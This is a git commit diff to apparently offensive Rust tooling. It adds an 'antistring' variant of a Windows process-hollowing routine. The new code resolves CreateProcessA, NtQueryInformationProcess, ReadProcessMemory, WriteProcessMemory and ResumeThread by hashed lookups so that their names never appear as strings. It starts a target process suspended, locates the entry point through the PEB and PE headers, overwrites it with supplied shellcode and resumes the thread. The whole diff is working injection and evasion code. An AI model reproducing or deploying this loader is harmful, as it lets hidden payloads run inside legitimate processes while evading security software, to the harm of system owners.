b199c6aaaee2763dd814ff97b14e09456e463987
koins <koins@duck.com>
2022-04-21 16:02:35 -0700

    antistring support for process hollowing

--- process_hollowing/src/rco_process_hollowing_windows/mod.rs
+++ process_hollowing/src/rco_process_hollowing_windows/mod.rs
@@ -2,8 +2,17 @@ extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
 use windows::core::{PCSTR, PSTR};
+use windows::Win32::System::Threading::{CREATE_SUSPENDED,PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, STARTUPINFOA};
+#[cfg(not(feature = "antistring"))]
+use windows::Win32::System::Threading::{CreateProcessA, NtQueryInformationProcess, ResumeThread};
+#[cfg(not(feature = "antistring"))]
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, ResumeThread, STARTUPINFOA};
+#[cfg(feature = "antistring")]
+use windows::Win32::Foundation::{BOOL, HANDLE};
+#[cfg(feature = "antistring")]
+use windows::Win32::Security::SECURITY_ATTRIBUTES;
+#[cfg(feature = "antistring")]
+use windows::Win32::System::Threading::PROCESS_CREATION_FLAGS;
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
@@ -30,6 +39,7 @@ fn array_to_u64_lit_end(array: &[u8; 8]) -> u64 {
     (array[7] as u64) << 56
 }
 
+#[cfg(not(feature = "antistring"))]
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
@@ -55,7 +65,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ptr::null(),
         false,
         CREATE_SUSPENDED,
-        ptr::null() as *const _,
+        ptr::null(),
         lp_current_directory,
         &startup_info,
         &mut process_information) };
@@ -63,16 +73,12 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         panic!("Could not create the suspended {target_process} with CreateProcessA");
     }
 
-    // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
-    // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
-    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
-    let process_handle = process_information.hProcess;
-    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
-    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
-    
     // Get the PEB base address of the suspended process with ZwQueryInformationProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
+    let process_handle = process_information.hProcess;
+    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
+    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
     if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
     }
@@ -117,4 +123,81 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     if resume_result != 1 {
         panic!("Could not resume the suspended {target_process}'s execution");
     }
+}
+
+#[cfg(feature = "antistring")]
+pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
+    // See line 44
+    let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
+
+    // See line 49
+    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
+
+    // See line 54
+    let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
+    let lp_application_name: PCSTR = unsafe { mem::zeroed() };
+    let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
+    lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
+    let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
+    unsafe {
+        mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
+        (function)(lp_application_name,
+                   lp_command_line,
+                   ptr::null(),
+                   ptr::null(),
+                   false,
+                   CREATE_SUSPENDED,
+                   ptr::null() as *const _,
+                   lp_current_directory,
+                   &startup_info,
+                   &mut process_information)
+    };
+
+    // See line 76
+    let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
+    let process_handle = process_information.hProcess;
+    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
+    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
+    unsafe { 
+        mem::transmute::<*const (), fn(HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32)>
+        (function)(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut())
+    };
+
+    // See line 86
+    let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
+    let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
+    let mut address_buffer = [0; POINTER_SIZE];
+    unsafe { 
+        mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
+        (function)(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as _, address_buffer.len(), ptr::null_mut())
+    };
+
+    // See line 96
+    let pe_base_address = array_to_u64_lit_end(&address_buffer);
+    let mut header_buffer = [0; 0x200];
+    unsafe { 
+        mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
+        (function)(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut())
+    };
+    if header_buffer[0] != 77 || header_buffer[1] != 90 {
+        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
+    }
+
+    // See line 106
+    let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
+    let e_lfanew = array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
+    let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
+    let entry_point_rva = array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
+    let entry_point_address = entry_point_rva as u64 + pe_base_address;
+    unsafe { 
+        mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
+        (function)(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut())
+    };
+
+    // See line 119
+    let function = rco_utils::find_function_address("Kernel32", 0x9f2eb3a0195b21d).unwrap();
+    unsafe { 
+        mem::transmute::<*const (), fn(HANDLE)>
+        (function)(process_information.hThread)
+    };
 }
